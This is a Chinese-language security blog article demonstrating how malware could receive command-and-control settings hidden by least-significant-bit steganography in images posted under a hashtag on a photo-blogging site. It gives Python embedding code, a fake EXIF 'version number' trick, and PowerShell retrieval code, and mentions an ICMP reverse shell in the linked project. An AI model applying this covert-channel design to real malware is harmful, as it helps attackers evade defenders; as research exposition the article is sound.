# 滥用图片博客做 C&C 配置

0x00 背景
=======

* * *

几个月前看到有文章介绍俄罗斯的 Hammertoss 恶意软件，使用 Twitter 作为 C&C 服务。以类似方式滥用 TechNet 的也有过报道【1】。脑洞了一下觉得，使用图片（或者其他格式）作为隐写（steganography）的载体来携带 C&C 控制命令更为隐蔽一些，而且携带的信息容量相对 twitter 的 140 字限制大得多。

一些轻博客可以保存用户上传的原始图片，还支持对图片添加标签（hash tag）。通过一个固定的 url 就可以获取到具有某个 hash tag 的图片。这样既可以无损嵌入隐蔽信息，还能很快定位到“有问题”的图片。在控制方需要修改配置（如 IP 发生变化）的时候，只需要登录社交网站，上传新的控制命令即可完成更新。灵活而更有隐蔽性。

本文示例中使用了最简单的隐写方式——最低有效位来嵌入 C&C 信息，有兴趣的读者也可以自行实现其他水印算法。图片博客选择了某国内流行的服务，仅作演示。

0x01 隐藏原理
=========

* * *

LSB 嵌入隐藏信息的思路非常简单。选择不带 Alpha 通道的 24 位位图作为载体，图片中每个像素具有 RGB 三个颜色分量，取值范围位 0x00 ~ 0xFF，共 8 个二进制位。这样一个像素可以表示 16777216 种颜色。

针对每一个颜色通道，修改其最低的二进制位，而其余 7 位保持不变，这样细小的差别在肉眼上难以分辨。如下图所示，前后两个色块看上去几乎没有差别。

![LSB](http://drops.javaweb.org/uploads/images/f2b5666c056dfbca9d0dba7be8b79cba7203bb50.jpg)

这样就在像素中“开辟”了携带信息的空间。通过将信息嵌入到最低有效位的方式，每个像素就可以携带 3bit 的信息，也就是 23 == 8 种状态。

0x02 图像的混合
==========

* * *

要想支持任意二进制数据的嵌入，还需要对原始数据进行预编码，将一个字节映射到多个像素中。正好有一种编码方式——base64，其特点是将二进制数据编码成为 64 个可打印的元字符，结尾使用 == 进行长度对齐。64 正好是 26，正好是两个像素使用最低有效位所能容纳的信息量。

由于 C&C 命令是不确定长度的，因此需要额外的字段来指明这个长度。可以模仿 IE 中 BSTR 的做法，在结构体起始元素中标明整个数组的长度；也可以利用图像的元数据，如 EXIF 来存储。

直接在 EXIF 中出现数据太容易被发现。笔者设计了一个算法，可以将一个不太大的正整数编码成为一个字符串，这个字符串肉眼看上去非常像一个软件的版本号。接着将这个“版本号”放置于 EXIF 的 Software 字段，看上去毫无违和感。

![Fake Version](http://drops.javaweb.org/uploads/images/9719137f460f7d15e4ab45d888458a126fd21d0a.jpg)

编码非常简单。先将 n 开平方后向下取整得 e；将 n 转换为 e 进制数，每一位得到一个数组 a；将 e 添加到数组 a 的第一个元素；以小数点为分隔符 join 得到字符串 s；最后倒转 s 得到 s' 即为“版本号”。例如 n=1992，开平方取整得到 e=44，1992 转为 44 进制得到`1992 = 12 * 442 + 1 * 441 + 1 * 440`，即得数组 [44, 12, 1, 1]，最后合并再反转字符得到 1.1.21.44，再加上个胡诌的软件名，真是个版本号的样子……

```
def fakever(n):
  def nums(num):
    base = int(num ** 0.5)
    yield base
    while num:
      yield num % base
      num //= base

  ver = map(str, nums(n)) if n >= 4 else (str(n), '1')
  return '.'.join(ver)[::-1]

```

将配置嵌入图片使用 PIL 库实现，基本流程如下：

*   读入 C&C 配置，将其编码成 64 个元字符，对应 0x00 - 0x40
*   读入图像，将其色彩模式转换为 RGB
*   每两个像素为一组，嵌入一个元字符
*   将嵌入数据的长度编码成所谓“版本号”，写入 EXIF 数据

虽然 PIL 的图像对象提供了`putpixel`和`getpixel`的方法来操作单个像素，但在批量处理大量像素的时候，这两个方法效率很低。更好的方式是使用`PIL.Image`对象的`tobytes`方法将图像转为像素数组，直接操作数组的值来修改像素。

完整代码见[github.com/ChiChou/lowershell/steg.py](https://github.com/ChiChou/lowershell/blob/91d05105afde7c415b33087a6bc9f4b36aeb1f92/util/steg.py)

需要注意的是，输出文件格式必须使用无损的 png 或者 bmp，推荐 png。JPEG 图像格式可能导致像素信息丢失，无法提取完整的数据。

接着注册一个马甲，把合成的图片上传到社交网络，指定一个标签即可。

0x04 隐藏信息的提取
============

* * *

作为“恶意软件”的一方，获取 C&C 配置仅需要请求一个社交网站的页面，解析 HTML 内容获得原图 url，最后下载并解码隐藏的信息。本文演示程序使用 PowerShell 编写。借助 .NET 的 HTML 解析和图像处理功能，可以轻松实现隐藏信息还原。

PowerShell 的`Invoke-WebRequest`cmdlet 可以发起一个 http 请求，返回页面的 document 对象。通过 document 对象可以对页面 DOM 树下的元素进行遍历和读取。例如 Images 属性可以获得页面中所有的图片元素。

以国内某图片博客为例，获取标签名为 world 的图片的原图 url 只需要一行：

```
(Invoke-WebRequest 'http://www.lofter.com/tag/world'l).Images | where {$_.'data-origin'} | % {$_.'data-origin' -replace "\?imageView.*$"}

```

PowerShell 的一大优势是可以直接调用 .NET 框架。.NET 的`System.Drawing`程序集提供了位图的处理功能，可以读取像素数据以及解析 EXIF。

提取信息的实现与图像嵌入的代码过程正好相反：

*   读取 EXIF，算出 payload（C&C配置文件）的长度
*   每两个像素为一组提取最低有效位，组成一个元字符
*   将元字符映射成 base64 编码字符串，解码即可得到原始隐藏数据

与 PIL 类似，在 .NET 中最佳的修改像素的方式也是直接修改数组。使用`Image`对象的`LockBits`将整个位图区域锁定为只读，接着使用 Marshal 将像素数据复制为二进制数组，直接操作数组而非像素可以提升速度。

```
$rect = [System.Drawing.Rectangle]::FromLTRB(0, 0, $img.width, $img.height)
$mode = [System.Drawing.Imaging.ImageLockMode]::ReadOnly
$format = [System.Drawing.Imaging.PixelFormat]::Format32bppArgb
$data = $img.LockBits($rect, $mode, $img.PixelFormat)
$size = [Math]::Abs($data.Stride) * $img.Height
$pixels = New-Object Byte[] $size
[System.Runtime.InteropServices.Marshal]::Copy($data.Scan0, $pixels, 0, $size) # 复制到缓冲区

```

完整代码参考

[github.com/ChiChou/lowershell/server/Lib/Steg.ps1](https://github.com/ChiChou/lowershell/blob/f05624c654103a8dd6ff55a8208a11f6f3313aa3/server/Lib/Steg.ps1)

在这个示例项目中还实现了带加密的 icmp 反弹 shell，不在本文讨论范围内，此处省略。

0x05 运行效果
=========

* * *

首先准备一张大小适合的图片，小了无法容纳数据，大了不方便网络传输。

![IMG_7495](http://drops.javaweb.org/uploads/images/f7a0f2fb99c62ebb84c1008693d6fb8bcc1ff3c0.jpg)

执行`python steg.py example.config.json IMG_7495.jpg blend.png`

得到合成的图片如下：

![blend](http://drops.javaweb.org/uploads/images/b38d08198d82728902feebf63f6b19f1d6c452c4.jpg)

粗看上去没有区别。以`#ThisIsAnUniqueSecretTag`为标签上传，接着换一个机器执行 PowerShell 脚本，可完整地将配置文件 example.config.json 读取出来。

![read](http://drops.javaweb.org/uploads/images/80c7f0532dc3cc5614faf59a6eedd294ed3eb886.jpg)

0x06 结语
=======

* * *

隐写术作为隐蔽通信的手段，在恶意软件中的应用由来已久。本文提出并实现了一种通过滥用图片社交网站来下发 C&C 控制指令的方法，仅作概念演示和抛砖引玉。

0x07 参考资料
=========

* * *

1.  [FireEye, Microsoft wipe TechNet clean of malware hidden by hackers](http://www.zdnet.com/article/fireeye-microsoft-wipe-technet-clean-of-malware-hidden-by-hackers/)
2.  [Wikipedia 隐写术](https://zh.wikipedia.org/wiki/%E9%9A%90%E5%86%99%E6%9C%AF)